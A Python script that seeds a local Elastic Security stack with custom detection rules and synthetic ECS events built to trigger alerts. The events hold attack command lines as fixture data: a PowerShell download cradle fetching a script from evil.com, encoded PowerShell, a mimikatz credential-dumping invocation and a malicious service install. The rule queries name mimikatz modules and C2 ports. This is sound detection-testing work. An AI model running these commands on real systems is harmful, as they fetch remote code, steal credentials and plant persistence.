"""
Seed real Elastic Security detection rules + matching ECS event data.

This script:
1. Installs Elastic prebuilt detection rules into the detection engine
2. Creates custom detection rules for scenarios we can trigger
3. Injects realistic ECS-formatted event data that WILL trigger those rules
4. Waits for alerts to appear in .alerts-security.alerts-default

Targets: Elasticsearch 8.17.1 + Kibana 8.17.1
"""

import json
import time
import random
import requests
from datetime import datetime, timezone, timedelta

ES_URL = "http://127.0.0.1:9200"
KIBANA_URL = "http://127.0.0.1:5601"
ES_USER = "elastic"
ES_PASS = "DocforgeTest2025"
AUTH = (ES_USER, ES_PASS)
HEADERS = {"kbn-xsrf": "true", "Content-Type": "application/json"}


def es_request(method, path, json_data=None):
    url = f"{ES_URL}{path}"
    resp = requests.request(method, url, auth=AUTH, json=json_data,
                           headers={"Content-Type": "application/json"})
    return resp


def kibana_request(method, path, json_data=None):
    url = f"{KIBANA_URL}{path}"
    resp = requests.request(method, url, auth=AUTH, json=json_data,
                           headers=HEADERS)
    return resp


def install_prebuilt_rules():
    """Install all prebuilt Elastic Security rules."""
    print("\n[1/5] Installing prebuilt detection rules...")
    resp = kibana_request("PUT", "/api/detection_engine/rules/prepackaged")
    if resp.status_code in (200, 201):
        data = resp.json()
        print(f"  Installed: {data.get('rules_installed', 0)} rules, "
              f"{data.get('timelines_installed', 0)} timelines")
    else:
        print(f"  Warning: {resp.status_code} - {resp.text[:200]}")
    return resp


def find_and_enable_rules():
    """Find specific prebuilt rules we'll trigger and enable them."""
    print("\n[2/5] Finding and enabling target rules...")

    # Rules we want to trigger with our test data
    target_rules = [
        "Attempts to Brute Force a Microsoft 365 User Account",
        "Multiple Logon Failure Followed by Logon Success",
        "Potential Credential Access via Windows Utilities",
        "Suspicious PowerShell Engine ImageLoad",
        "Potential DNS Tunneling via Iodine",
        "Unusual Process Execution Path",
    ]

    enabled_count = 0

    # Search for rules matching our targets
    for rule_name in target_rules:
        resp = kibana_request("GET",
            f"/api/detection_engine/rules/_find?per_page=5&search={requests.utils.quote(rule_name)}")
        if resp.status_code == 200:
            data = resp.json()
            for rule in data.get("data", []):
                if not rule.get("enabled"):
                    # Enable the rule
                    patch_resp = kibana_request("PATCH",
                        "/api/detection_engine/rules",
                        {"id": rule["id"], "enabled": True})
                    if patch_resp.status_code == 200:
                        print(f"  Enabled: {rule['name']}")
                        enabled_count += 1

    print(f"  Total prebuilt rules enabled: {enabled_count}")
    return enabled_count


def create_custom_rules():
    """Create custom detection rules designed to trigger on our test data."""
    print("\n[3/5] Creating custom detection rules...")

    rules = [
        {
            "name": "Brute Force SSH Login Attempts",
            "description": "Detects multiple failed SSH authentication attempts from a single source IP, indicating a potential brute force attack.",
            "risk_score": 73,
            "severity": "high",
            "type": "query",
            "query": 'event.category:"authentication" AND event.outcome:"failure" AND event.action:"ssh_login"',
            "index": ["logs-*", "filebeat-*", "auditbeat-*"],
            "interval": "1m",
            "from": "now-5m",
            "language": "kuery",
            "enabled": True,
            "tags": ["Brute Force", "SSH", "Credential Access"],
            "threat": [
                {
                    "framework": "MITRE ATT&CK",
                    "tactic": {
                        "id": "TA0006",
                        "name": "Credential Access",
                        "reference": "https://attack.mitre.org/tactics/TA0006/"
                    },
                    "technique": [
                        {
                            "id": "T1110",
                            "name": "Brute Force",
                            "reference": "https://attack.mitre.org/techniques/T1110/",
                            "subtechnique": [
                                {
                                    "id": "T1110.001",
                                    "name": "Password Guessing",
                                    "reference": "https://attack.mitre.org/techniques/T1110/001/"
                                }
                            ]
                        }
                    ]
                }
            ],
        },
        {
            "name": "Suspicious PowerShell Encoded Command",
            "description": "Detects PowerShell execution with encoded commands, commonly used by malware and post-exploitation tools.",
            "risk_score": 85,
            "severity": "critical",
            "type": "query",
            "query": 'process.name:"powershell.exe" AND process.args:("-EncodedCommand" OR "-enc" OR "-e") AND event.category:"process"',
            "index": ["logs-*", "winlogbeat-*", "endgame-*"],
            "interval": "1m",
            "from": "now-5m",
            "language": "kuery",
            "enabled": True,
            "tags": ["PowerShell", "Execution", "Defense Evasion"],
            "threat": [
                {
                    "framework": "MITRE ATT&CK",
                    "tactic": {
                        "id": "TA0002",
                        "name": "Execution",
                        "reference": "https://attack.mitre.org/tactics/TA0002/"
                    },
                    "technique": [
                        {
                            "id": "T1059",
                            "name": "Command and Scripting Interpreter",
                            "reference": "https://attack.mitre.org/techniques/T1059/",
                            "subtechnique": [
                                {
                                    "id": "T1059.001",
                                    "name": "PowerShell",
                                    "reference": "https://attack.mitre.org/techniques/T1059/001/"
                                }
                            ]
                        }
                    ]
                }
            ],
        },
        {
            "name": "Potential Data Exfiltration via DNS",
            "description": "Detects unusually long DNS queries that may indicate DNS tunneling or data exfiltration via DNS.",
            "risk_score": 68,
            "severity": "high",
            "type": "query",
            "query": 'event.category:"network" AND dns.question.type:"TXT" AND event.action:"dns_query"',
            "index": ["logs-*", "packetbeat-*", "filebeat-*"],
            "interval": "1m",
            "from": "now-5m",
            "language": "kuery",
            "enabled": True,
            "tags": ["DNS", "Exfiltration", "C2"],
            "threat": [
                {
                    "framework": "MITRE ATT&CK",
                    "tactic": {
                        "id": "TA0010",
                        "name": "Exfiltration",
                        "reference": "https://attack.mitre.org/tactics/TA0010/"
                    },
                    "technique": [
                        {
                            "id": "T1048",
                            "name": "Exfiltration Over Alternative Protocol",
                            "reference": "https://attack.mitre.org/techniques/T1048/",
                            "subtechnique": [
                                {
                                    "id": "T1048.003",
                                    "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
                                    "reference": "https://attack.mitre.org/techniques/T1048/003/"
                                }
                            ]
                        }
                    ]
                }
            ],
        },
        {
            "name": "Malware Detected - Endpoint Security",
            "description": "Detects endpoint security malware detection events from agents.",
            "risk_score": 95,
            "severity": "critical",
            "type": "query",
            "query": 'event.kind:"alert" AND event.category:"malware" AND event.action:"malware_detected"',
            "index": ["logs-*", "endgame-*"],
            "interval": "1m",
            "from": "now-5m",
            "language": "kuery",
            "enabled": True,
            "tags": ["Malware", "Endpoint"],
            "threat": [
                {
                    "framework": "MITRE ATT&CK",
                    "tactic": {
                        "id": "TA0002",
                        "name": "Execution",
                        "reference": "https://attack.mitre.org/tactics/TA0002/"
                    },
                    "technique": [
                        {
                            "id": "T1204",
                            "name": "User Execution",
                            "reference": "https://attack.mitre.org/techniques/T1204/",
                            "subtechnique": [
                                {
                                    "id": "T1204.002",
                                    "name": "Malicious File",
                                    "reference": "https://attack.mitre.org/techniques/T1204/002/"
                                }
                            ]
                        }
                    ]
                }
            ],
        },
        {
            "name": "Lateral Movement via RDP",
            "description": "Detects Remote Desktop Protocol connections from unusual source hosts, indicating potential lateral movement.",
            "risk_score": 60,
            "severity": "medium",
            "type": "query",
            "query": 'destination.port:3389 AND event.category:"network" AND event.action:"connection_attempted" AND NOT source.ip:(10.0.0.1 OR 10.0.0.2)',
            "index": ["logs-*", "packetbeat-*"],
            "interval": "1m",
            "from": "now-5m",
            "language": "kuery",
            "enabled": True,
            "tags": ["Lateral Movement", "RDP"],
            "threat": [
                {
                    "framework": "MITRE ATT&CK",
                    "tactic": {
                        "id": "TA0008",
                        "name": "Lateral Movement",
                        "reference": "https://attack.mitre.org/tactics/TA0008/"
                    },
                    "technique": [
                        {
                            "id": "T1021",
                            "name": "Remote Services",
                            "reference": "https://attack.mitre.org/techniques/T1021/",
                            "subtechnique": [
                                {
                                    "id": "T1021.001",
                                    "name": "Remote Desktop Protocol",
                                    "reference": "https://attack.mitre.org/techniques/T1021/001/"
                                }
                            ]
                        }
                    ]
                }
            ],
        },
        {
            "name": "Suspicious Outbound Connection to Rare Port",
            "description": "Detects outbound network connections to uncommon high ports that may indicate C2 communication or data exfiltration.",
            "risk_score": 50,
            "severity": "medium",
            "type": "query",
            "query": 'event.category:"network" AND event.action:"connection_attempted" AND destination.port:(4444 OR 5555 OR 8888 OR 1337 OR 31337 OR 6666 OR 6667)',
            "index": ["logs-*", "packetbeat-*"],
            "interval": "1m",
            "from": "now-5m",
            "language": "kuery",
            "enabled": True,
            "tags": ["C2", "Network", "Suspicious Port"],
            "threat": [
                {
                    "framework": "MITRE ATT&CK",
                    "tactic": {
                        "id": "TA0011",
                        "name": "Command and Control",
                        "reference": "https://attack.mitre.org/tactics/TA0011/"
                    },
                    "technique": [
                        {
                            "id": "T1571",
                            "name": "Non-Standard Port",
                            "reference": "https://attack.mitre.org/techniques/T1571/"
                        }
                    ]
                }
            ],
        },
        {
            "name": "Credential Dumping via Mimikatz",
            "description": "Detects process execution patterns associated with Mimikatz credential harvesting tool.",
            "risk_score": 90,
            "severity": "critical",
            "type": "query",
            "query": 'process.name:("mimikatz.exe" OR "mimi.exe") OR (process.args:"sekurlsa::logonpasswords" OR process.args:"lsadump::sam")',
            "index": ["logs-*", "winlogbeat-*", "endgame-*"],
            "interval": "1m",
            "from": "now-5m",
            "language": "kuery",
            "enabled": True,
            "tags": ["Credential Dumping", "Mimikatz", "Critical"],
            "threat": [
                {
                    "framework": "MITRE ATT&CK",
                    "tactic": {
                        "id": "TA0006",
                        "name": "Credential Access",
                        "reference": "https://attack.mitre.org/tactics/TA0006/"
                    },
                    "technique": [
                        {
                            "id": "T1003",
                            "name": "OS Credential Dumping",
                            "reference": "https://attack.mitre.org/techniques/T1003/",
                            "subtechnique": [
                                {
                                    "id": "T1003.001",
                                    "name": "LSASS Memory",
                                    "reference": "https://attack.mitre.org/techniques/T1003/001/"
                                }
                            ]
                        }
                    ]
                }
            ],
        },
        {
            "name": "Phishing - Suspicious Office Document Execution",
            "description": "Detects Microsoft Office applications spawning suspicious child processes, indicating potential phishing payload execution.",
            "risk_score": 78,
            "severity": "high",
            "type": "query",
            "query": 'process.parent.name:("WINWORD.EXE" OR "EXCEL.EXE" OR "OUTLOOK.EXE") AND process.name:("cmd.exe" OR "powershell.exe" OR "wscript.exe" OR "cscript.exe" OR "mshta.exe")',
            "index": ["logs-*", "winlogbeat-*", "endgame-*"],
            "interval": "1m",
            "from": "now-5m",
            "language": "kuery",
            "enabled": True,
            "tags": ["Phishing", "Initial Access", "Office"],
            "threat": [
                {
                    "framework": "MITRE ATT&CK",
                    "tactic": {
                        "id": "TA0001",
                        "name": "Initial Access",
                        "reference": "https://attack.mitre.org/tactics/TA0001/"
                    },
                    "technique": [
                        {
                            "id": "T1566",
                            "name": "Phishing",
                            "reference": "https://attack.mitre.org/techniques/T1566/",
                            "subtechnique": [
                                {
                                    "id": "T1566.001",
                                    "name": "Spearphishing Attachment",
                                    "reference": "https://attack.mitre.org/techniques/T1566/001/"
                                }
                            ]
                        }
                    ]
                }
            ],
        },
    ]

    created = 0
    for rule in rules:
        resp = kibana_request("POST", "/api/detection_engine/rules", rule)
        if resp.status_code in (200, 201):
            print(f"  Created: {rule['name']} ({rule['severity']})")
            created += 1
        elif resp.status_code == 409:
            print(f"  Exists:  {rule['name']}")
        else:
            print(f"  Error:   {rule['name']} - {resp.status_code}: {resp.text[:100]}")

    print(f"  Total custom rules created: {created}")
    return created


def inject_event_data():
    """Inject realistic ECS event data that will trigger our detection rules."""
    print("\n[4/5] Injecting realistic ECS event data...")

    now = datetime.now(timezone.utc)
    events = []

    # --- Brute Force SSH Events (15 failures + 1 success from attacker IP) ---
    attacker_ip = "185.220.101.34"
    target_host = "prod-web-01.corp.local"
    for i in range(15):
        ts = (now - timedelta(minutes=random.randint(1, 4))).isoformat()
        events.append({
            "@timestamp": ts,
            "event": {
                "kind": "event",
                "category": ["authentication"],
                "type": ["start"],
                "action": "ssh_login",
                "outcome": "failure",
                "module": "system",
                "dataset": "system.auth"
            },
            "source": {
                "ip": attacker_ip,
                "port": random.randint(40000, 65535),
                "geo": {
                    "country_name": "Russia",
                    "city_name": "Moscow",
                    "location": {"lat": 55.7558, "lon": 37.6173}
                }
            },
            "destination": {
                "ip": "10.1.2.15",
                "port": 22
            },
            "host": {"name": target_host, "hostname": target_host, "os": {"family": "linux", "name": "Ubuntu", "version": "22.04"}},
            "user": {"name": "root", "id": "0"},
            "message": f"Failed password for root from {attacker_ip} port {random.randint(40000,65535)} ssh2",
            "data_stream": {"type": "logs", "dataset": "system.auth", "namespace": "linux"},
            "tags": ["authentication", "ssh"],
        })

    # Successful login after brute force
    events.append({
        "@timestamp": now.isoformat(),
        "event": {
            "kind": "event", "category": ["authentication"], "type": ["start"],
            "action": "ssh_login", "outcome": "success", "module": "system", "dataset": "system.auth"
        },
        "source": {"ip": attacker_ip, "port": 54321,
                    "geo": {"country_name": "Russia", "city_name": "Moscow", "location": {"lat": 55.7558, "lon": 37.6173}}},
        "destination": {"ip": "10.1.2.15", "port": 22},
        "host": {"name": target_host, "hostname": target_host, "os": {"family": "linux"}},
        "user": {"name": "root"},
        "message": f"Accepted password for root from {attacker_ip} port 54321 ssh2",
        "data_stream": {"type": "logs", "dataset": "system.auth", "namespace": "linux"},
        "tags": ["authentication", "ssh"],
    })

    # --- Suspicious PowerShell Encoded Command ---
    for ps_event in [
        {
            "host_name": "WS-FINANCE-03.corp.local",
            "user": "jsmith",
            "args": ["powershell.exe", "-NoProfile", "-NonInteractive", "-EncodedCommand", "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=="],
            "parent": "OUTLOOK.EXE",
            "pid": 4892,
        },
        {
            "host_name": "WS-HR-07.corp.local",
            "user": "mwilliams",
            "args": ["powershell.exe", "-w", "hidden", "-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA"],
            "parent": "WINWORD.EXE",
            "pid": 7234,
        },
    ]:
        ts = (now - timedelta(seconds=random.randint(30, 180))).isoformat()
        events.append({
            "@timestamp": ts,
            "event": {
                "kind": "event", "category": ["process"], "type": ["start"],
                "action": "process_started", "module": "sysmon", "dataset": "windows.sysmon"
            },
            "process": {
                "name": "powershell.exe",
                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "args": ps_event["args"],
                "pid": ps_event["pid"],
                "parent": {"name": ps_event["parent"], "pid": ps_event["pid"] - 100},
                "command_line": " ".join(ps_event["args"]),
            },
            "host": {"name": ps_event["host_name"], "hostname": ps_event["host_name"],
                      "os": {"family": "windows", "name": "Windows 11", "version": "10.0.22621"}},
            "user": {"name": ps_event["user"], "domain": "CORP"},
            "message": f"Suspicious PowerShell with encoded command on {ps_event['host_name']}",
            "data_stream": {"type": "logs", "dataset": "windows.sysmon", "namespace": "windows"},
            "tags": ["powershell", "encoded"],
        })

    # --- DNS Tunneling TXT queries ---
    c2_domains = [
        "a]x7kf9g2m.data.evil-c2-server.ru",
        "b]j3np8w1q.data.evil-c2-server.ru",
        "c]r5yt4e6h.data.evil-c2-server.ru",
        "d]m9bv2k7s.data.evil-c2-server.ru",
    ]
    for domain in c2_domains:
        ts = (now - timedelta(seconds=random.randint(10, 120))).isoformat()
        events.append({
            "@timestamp": ts,
            "event": {
                "kind": "event", "category": ["network"], "type": ["protocol"],
                "action": "dns_query", "module": "dns", "dataset": "network.dns"
            },
            "dns": {
                "question": {"name": domain.replace("]", ""), "type": "TXT", "class": "IN"},
                "response_code": "NOERROR",
            },
            "source": {"ip": "10.1.5.42", "port": random.randint(49152, 65535)},
            "destination": {"ip": "8.8.8.8", "port": 53},
            "host": {"name": "WS-DEV-12.corp.local"},
            "user": {"name": "acooper"},
            "network": {"protocol": "dns", "transport": "udp", "direction": "outbound"},
            "message": f"DNS TXT query for {domain.replace(']', '')} - potential tunneling",
            "data_stream": {"type": "logs", "dataset": "network.dns", "namespace": "network"},
            "tags": ["dns", "tunneling"],
        })

    # --- Malware Detection Events ---
    malware_events = [
        {"host": "WS-ACCT-05.corp.local", "user": "bparker", "file": "C:\\Users\\bparker\\Downloads\\invoice_q4_2025.exe",
         "malware_name": "Trojan.GenericKD.48291034", "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
        {"host": "SRV-FILE-02.corp.local", "user": "SYSTEM", "file": "C:\\Temp\\svchost_update.exe",
         "malware_name": "Ransom.WannaCry.Generic", "sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"},
    ]
    for mw in malware_events:
        ts = (now - timedelta(seconds=random.randint(5, 90))).isoformat()
        events.append({
            "@timestamp": ts,
            "event": {
                "kind": "alert", "category": ["malware"], "type": ["info"],
                "action": "malware_detected", "module": "endpoint", "dataset": "endpoint.alerts",
                "severity": 1,
            },
            "file": {
                "name": mw["file"].split("\\")[-1],
                "path": mw["file"],
                "hash": {"sha256": mw["sha256"]},
            },
            "host": {"name": mw["host"], "hostname": mw["host"],
                      "os": {"family": "windows", "name": "Windows Server 2022"}},
            "user": {"name": mw["user"]},
            "message": f"Malware detected: {mw['malware_name']} at {mw['file']}",
            "threat": {"indicator": {"type": "file", "file_hash": mw["sha256"]},
                       "software": {"name": mw["malware_name"]}},
            "data_stream": {"type": "logs", "dataset": "endpoint.alerts", "namespace": "windows"},
            "tags": ["malware", "endpoint_security"],
        })

    # --- Lateral Movement via RDP ---
    rdp_sources = [
        {"ip": "10.1.5.42", "host": "WS-DEV-12", "user": "acooper"},
        {"ip": "10.1.8.99", "host": "WS-MKTG-01", "user": "tgreen"},
        {"ip": "172.16.0.55", "host": "UNKNOWN-HOST", "user": "admin"},
    ]
    rdp_targets = [
        {"ip": "10.1.1.10", "host": "DC-01.corp.local"},
        {"ip": "10.1.2.20", "host": "SRV-SQL-01.corp.local"},
        {"ip": "10.1.2.25", "host": "SRV-FILE-02.corp.local"},
    ]
    for src in rdp_sources:
        tgt = random.choice(rdp_targets)
        ts = (now - timedelta(seconds=random.randint(10, 200))).isoformat()
        events.append({
            "@timestamp": ts,
            "event": {
                "kind": "event", "category": ["network"], "type": ["connection"],
                "action": "connection_attempted", "module": "network", "dataset": "network.flow"
            },
            "source": {"ip": src["ip"], "port": random.randint(49152, 65535)},
            "destination": {"ip": tgt["ip"], "port": 3389, "domain": tgt["host"]},
            "host": {"name": src["host"]},
            "user": {"name": src["user"]},
            "network": {"protocol": "tcp", "transport": "tcp", "direction": "outbound"},
            "message": f"RDP connection from {src['host']} ({src['ip']}) to {tgt['host']} ({tgt['ip']})",
            "data_stream": {"type": "logs", "dataset": "network.flow", "namespace": "network"},
            "tags": ["rdp", "lateral_movement"],
        })

    # --- C2 Beaconing on Suspicious Ports ---
    c2_connections = [
        {"src_ip": "10.1.5.42", "dst_ip": "45.33.32.156", "port": 4444, "host": "WS-DEV-12.corp.local",
         "geo": {"country_name": "United States", "city_name": "Fremont"}},
        {"src_ip": "10.1.8.99", "dst_ip": "198.51.100.23", "port": 8888, "host": "WS-MKTG-01.corp.local",
         "geo": {"country_name": "China", "city_name": "Beijing"}},
        {"src_ip": "10.1.3.15", "dst_ip": "203.0.113.42", "port": 1337, "host": "SRV-APP-01.corp.local",
         "geo": {"country_name": "North Korea", "city_name": "Pyongyang"}},
    ]
    for c2 in c2_connections:
        for beacon_i in range(5):  # 5 beacons each
            ts = (now - timedelta(seconds=random.randint(0, 240))).isoformat()
            events.append({
                "@timestamp": ts,
                "event": {
                    "kind": "event", "category": ["network"], "type": ["connection"],
                    "action": "connection_attempted", "module": "network", "dataset": "network.flow"
                },
                "source": {"ip": c2["src_ip"], "port": random.randint(49152, 65535)},
                "destination": {"ip": c2["dst_ip"], "port": c2["port"],
                                "geo": c2["geo"]},
                "host": {"name": c2["host"]},
                "network": {"protocol": "tcp", "direction": "outbound",
                            "bytes": random.randint(64, 512)},
                "message": f"Outbound connection to {c2['dst_ip']}:{c2['port']}",
                "data_stream": {"type": "logs", "dataset": "network.flow", "namespace": "network"},
                "tags": ["c2", "suspicious_port"],
            })

    # --- Mimikatz Credential Dumping ---
    ts = (now - timedelta(seconds=random.randint(10, 60))).isoformat()
    events.append({
        "@timestamp": ts,
        "event": {
            "kind": "event", "category": ["process"], "type": ["start"],
            "action": "process_started", "module": "sysmon", "dataset": "windows.sysmon"
        },
        "process": {
            "name": "mimikatz.exe",
            "executable": "C:\\Users\\admin\\Desktop\\tools\\mimikatz.exe",
            "args": ["mimikatz.exe", "privilege::debug", "sekurlsa::logonpasswords", "exit"],
            "pid": 9912,
            "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        },
        "host": {"name": "DC-01.corp.local", "hostname": "DC-01.corp.local",
                  "os": {"family": "windows", "name": "Windows Server 2022", "version": "10.0.20348"}},
        "user": {"name": "admin", "domain": "CORP", "id": "S-1-5-21-123456-1001"},
        "message": "Mimikatz credential dumping detected on domain controller",
        "data_stream": {"type": "logs", "dataset": "windows.sysmon", "namespace": "windows"},
        "tags": ["mimikatz", "credential_dumping", "critical"],
    })

    # --- Phishing: Office spawning PowerShell ---
    events.append({
        "@timestamp": (now - timedelta(seconds=45)).isoformat(),
        "event": {
            "kind": "event", "category": ["process"], "type": ["start"],
            "action": "process_started", "module": "sysmon", "dataset": "windows.sysmon"
        },
        "process": {
            "name": "powershell.exe",
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "args": ["powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
                     "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')"],
            "pid": 11204,
            "parent": {"name": "WINWORD.EXE", "pid": 8832,
                       "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"},
            "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')\"",
        },
        "host": {"name": "WS-EXEC-01.corp.local", "hostname": "WS-EXEC-01.corp.local",
                  "os": {"family": "windows", "name": "Windows 11"}},
        "user": {"name": "cjohnson", "domain": "CORP"},
        "file": {"name": "Q4_Financial_Report.docm", "path": "C:\\Users\\cjohnson\\Downloads\\Q4_Financial_Report.docm"},
        "message": "WINWORD.EXE spawned powershell.exe with download cradle",
        "data_stream": {"type": "logs", "dataset": "windows.sysmon", "namespace": "windows"},
        "tags": ["phishing", "macro", "initial_access"],
    })

    # --- Privilege Escalation: Unusual Service Installation ---
    events.append({
        "@timestamp": (now - timedelta(seconds=30)).isoformat(),
        "event": {
            "kind": "event", "category": ["process", "configuration"], "type": ["change"],
            "action": "service_installed", "module": "system", "dataset": "system.security"
        },
        "process": {
            "name": "sc.exe",
            "executable": "C:\\Windows\\System32\\sc.exe",
            "args": ["sc.exe", "create", "evil_svc", "binPath=", "C:\\Temp\\payload.exe", "start=", "auto"],
            "pid": 6644,
            "command_line": "sc.exe create evil_svc binPath= C:\\Temp\\payload.exe start= auto",
        },
        "host": {"name": "SRV-APP-01.corp.local",
                  "os": {"family": "windows", "name": "Windows Server 2022"}},
        "user": {"name": "admin", "domain": "CORP"},
        "service": {"name": "evil_svc", "type": "win32"},
        "message": "Suspicious service 'evil_svc' installed with binary at C:\\Temp\\payload.exe",
        "data_stream": {"type": "logs", "dataset": "system.security", "namespace": "windows"},
        "tags": ["persistence", "service_creation"],
    })

    # Bulk index all events into logs-ion.events-default
    print(f"  Indexing {len(events)} events...")

    # Create regular indices (not data streams) to avoid template issues
    # Use index names matching the rule index patterns: logs-*, filebeat-*, winlogbeat-*
    index_map = {
        "system.auth": "logs-system-auth",
        "windows.sysmon": "logs-windows-sysmon",
        "network.dns": "logs-network-dns",
        "endpoint.alerts": "logs-endpoint-alerts",
        "network.flow": "logs-network-flow",
        "system.security": "logs-system-security",
    }

    # Fleet index templates auto-create data streams for logs-*.
    # Data streams require op_type=create in bulk API.
    bulk_body = ""
    for event in events:
        ds = event.get("data_stream", {})
        dataset = ds.get("dataset", "generic")
        index_name = index_map.get(dataset, "logs-ion-events")
        bulk_body += json.dumps({"create": {"_index": index_name}}) + "\n"
        bulk_body += json.dumps(event) + "\n"

    resp = requests.post(
        f"{ES_URL}/_bulk",
        auth=AUTH,
        headers={"Content-Type": "application/x-ndjson"},
        data=bulk_body,
    )

    if resp.status_code == 200:
        result = resp.json()
        errors = sum(1 for item in result.get("items", []) if item.get("index", {}).get("error"))
        print(f"  Indexed: {len(events) - errors}/{len(events)} events")
        if errors:
            # Show first error
            for item in result["items"]:
                if item.get("index", {}).get("error"):
                    print(f"  First error: {json.dumps(item['index']['error'])[:200]}")
                    break
    else:
        print(f"  Bulk index error: {resp.status_code} - {resp.text[:200]}")

    # Refresh all logs indices
    es_request("POST", "/logs-*/_refresh")

    return len(events)


def wait_for_alerts():
    """Wait for detection rules to process events and generate alerts."""
    print("\n[5/5] Waiting for detection rules to generate alerts...")
    print("  Rules run every 1 minute. Waiting up to 3 minutes...")

    alert_index = ".alerts-security.alerts-default"

    for i in range(18):  # 18 * 10s = 3 minutes
        time.sleep(10)

        resp = es_request("POST", f"/{alert_index}/_search", {
            "size": 0,
            "query": {"match_all": {}},
        })

        if resp.status_code == 200:
            total = resp.json().get("hits", {}).get("total", {}).get("value", 0)
            print(f"  [{(i+1)*10}s] Alerts found: {total}")
            if total > 0:
                # Show alert details
                detail_resp = es_request("POST", f"/{alert_index}/_search", {
                    "size": 20,
                    "sort": [{"@timestamp": "desc"}],
                    "_source": ["kibana.alert.rule.name", "kibana.alert.severity",
                                "kibana.alert.workflow_status", "@timestamp"],
                })
                if detail_resp.status_code == 200:
                    print("\n  === Alerts Generated ===")
                    for hit in detail_resp.json().get("hits", {}).get("hits", []):
                        src = hit["_source"]
                        rule = src.get("kibana.alert.rule", {}).get("name", "Unknown")
                        sev = src.get("kibana.alert.severity", "?")
                        status = src.get("kibana.alert.workflow_status", "?")
                        print(f"  [{sev:>8}] {rule} (status: {status})")

                if total >= 5:
                    print(f"\n  {total} alerts generated successfully!")
                    return total
        else:
            print(f"  [{(i+1)*10}s] Query error: {resp.status_code}")

    # Final count
    resp = es_request("POST", f"/{alert_index}/_search", {"size": 0})
    total = resp.json().get("hits", {}).get("total", {}).get("value", 0) if resp.status_code == 200 else 0
    print(f"\n  Final alert count: {total}")
    return total


def main():
    print("=" * 60)
    print("ION Real Alert Seeder")
    print("ES 8.17.1 + Kibana 8.17.1 Detection Engine")
    print("=" * 60)

    # Step 1: Install prebuilt rules
    install_prebuilt_rules()

    # Step 2: Enable relevant prebuilt rules
    find_and_enable_rules()

    # Step 3: Create custom detection rules
    create_custom_rules()

    # Step 4: Inject matching event data
    event_count = inject_event_data()

    # Step 5: Wait for alerts
    alert_count = wait_for_alerts()

    print("\n" + "=" * 60)
    print(f"DONE: {event_count} events injected, {alert_count} alerts generated")
    print(f"Alert index: .alerts-security.alerts-default")
    print(f"\nTo view in ION, ensure ES config uses:")
    print(f"  alert_index = .alerts-security.alerts-default")
    print("=" * 60)


if __name__ == "__main__":
    main()
